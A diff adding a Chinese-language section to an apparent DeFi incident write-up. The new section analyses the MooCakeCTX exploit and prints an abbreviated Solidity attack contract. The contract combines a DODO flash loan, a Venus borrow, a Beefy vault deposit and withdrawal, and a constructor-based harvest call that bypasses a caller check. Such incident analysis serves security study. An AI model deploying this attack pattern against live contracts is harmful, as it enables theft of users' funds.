@@ -73,6 +73,57 @@ https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a
 </li>
 </ul>
 
-### MooCakeCTX exp细节解析
+### MooCakeCTX exp解析
+[exp提供者](https://github.com/SunWeb3Sec/DeFiHackLabs)
 
-(待更新)
+moocakeCTX exp只包含大体结构,代码省略了部分不关键的地方：
+```js
+//接口实现+其他接口
+interface StrategySyrup {...}
+
+contract Harvest {
+    //构造函数中执行来绕过
+    constructor(){
+        StrategySyrup strategySyrup = StrategySyrup(...);
+        strategySyrup.harvest();
+    }
+}
+
+contract exp {
+    function Exploit() public {
+        //交换一点CTK
+        WBNBToCTK();
+        CTK.transfer(address(SmartChef), CTK.balanceOf(address(this)));
+        //执行dodo的闪电贷
+        DVM(dodo).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));
+    }
+
+    //回调函数中执行逻辑
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
+        address [] memory cTokens = new address[](2);
+        cTokens[0] = address(vBUSD);
+        cTokens[1] = address(vCAKE);
+        //控制器token的格式数组
+        unitroller.enterMarkets(cTokens);
+        BUSD.approve(address(vBUSD), type(uint).max);
+        //mintVBUSD
+        vBUSD.mint(BUSD.balanceOf(address(this)));
+        //借VCake
+        vCAKE.borrow(50_000 * 1e18);
+        CAKE.approve(address(beefyVault), type(uint).max);
+        //viper合约中质押所有
+        beefyVault.depositAll();
+        //初始化并且执行，绕过。
+        Harvest harvest = new Harvest();
+        //取走
+        beefyVault.withdrawAll();
+        //偿还
+        CAKE.approve(address(vCAKE), type(uint).max);
+        vCAKE.repayBorrow(50_000 * 1e18);
+        vBUSD.redeemUnderlying(400_000 * 1e18);
+        //归还闪电贷
+        BUSD.transfer(dodo, 400_000 * 1e18);
+    }
+}
+
+```
